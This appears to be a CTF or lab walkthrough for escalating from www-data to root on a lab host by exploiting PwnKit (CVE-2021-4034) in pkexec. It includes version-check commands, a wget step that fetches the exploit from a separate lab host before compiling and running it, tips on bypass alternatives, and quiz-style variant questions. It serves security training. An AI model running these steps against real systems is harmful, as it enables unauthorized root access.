# Scenario 23 — PwnKit (CVE-2021-4034) local root

**Difficulty:** 🟢 | **Time:** ~10 min | **Domains:** 06, 13
**Tools:** shell, `gcc`

## Story
You have a shell as `www-data` on 10.10.10.23 (Ubuntu 20.04). Exploit PwnKit to gain root and read `/root/flag.txt`.

## Step 1 — Fingerprint the host
```bash
cat /etc/os-release
uname -a
ls -la /usr/bin/pkexec
```
**Expected finding:** pkexec exists and is SUID root. Ubuntu 20.04/Debian 10/CentOS 7 unpatched ≈ vulnerable.

## Step 2 — Confirm polkit version
```bash
dpkg -l | grep policykit   # Debian
rpm -q polkit              # RHEL
```
**Expected finding:** policykit-1 < 0.105-31ubuntu0.1 = vulnerable.

## Step 3 — Grab exploit
```bash
cd /tmp
wget http://10.10.10.99/CVE-2021-4034.tar.gz -O pk.tgz
tar xzf pk.tgz && cd CVE-2021-4034
make
```
**Expected finding:** `cve-2021-4034` binary.

## Step 4 — Run it
```bash
./cve-2021-4034
```
**Expected finding:** `# ` prompt, `id` shows `uid=0(root)`.

## Step 5 — Read the flag
```bash
cat /root/flag.txt
```

## Step 6 — Final answer
**Answer format:** flag string.

## Gotchas across this chain
- If `gcc` isn't installed, use the Python PoC (`PwnKit.py`) or a precompiled static binary.
- Patched pkexec logs "The value for the SHELL variable was not found the /etc/shells file" — that's a sign of exploit attempts, but patched systems still fail.
- Works even on hardened systems as long as pkexec is SUID and polkit is unpatched.
- Does NOT require any creds — triggers from any user shell.

## Variant questions this scenario teaches
- "What CVE affects pkexec in 2022?"
- "Which file is the vulnerability in?" → `pkexec.c`
- "What is the fix version of polkit on Ubuntu 20.04?"

